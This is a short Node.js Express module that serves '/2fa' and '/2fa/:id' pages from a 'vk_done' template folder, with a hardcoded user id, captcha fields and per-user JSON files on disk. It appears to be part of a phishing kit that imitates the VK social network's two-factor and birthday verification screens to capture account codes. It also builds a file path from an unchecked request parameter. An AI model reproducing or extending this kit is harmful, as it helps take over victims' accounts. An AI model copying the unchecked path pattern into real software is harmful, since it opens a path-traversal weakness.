const request = require('request')
const fs = require('fs');

function start_2fa(app) {
    app.get(`/2fa`, (req, res) => {
      return res.render(`vk_done/birthday/index.ejs`, {
          id: "343783264",
          error: 0,
          capcha: {
            status: 0
          }
        })
    });

    app.get(`/2fa/:id`, (req, res) => {

      fs.access(`./users/${req.params.id}.json`, function(error) {
        if (error) {
            res.render(`vk_done/2fa/index.ejs`, {
            id: "343783264",
            ads: false,
            error: 0,
            capcha: {
                status: 0
            }
            })
        } else {
            res.render(`vk_done/2fa/index.ejs`, {
            id: req.params.id,
            error: 0,
            capcha: {
                status: 0
            }
            })
        }
      })
    });
}

module.exports = {
    start_2fa
}
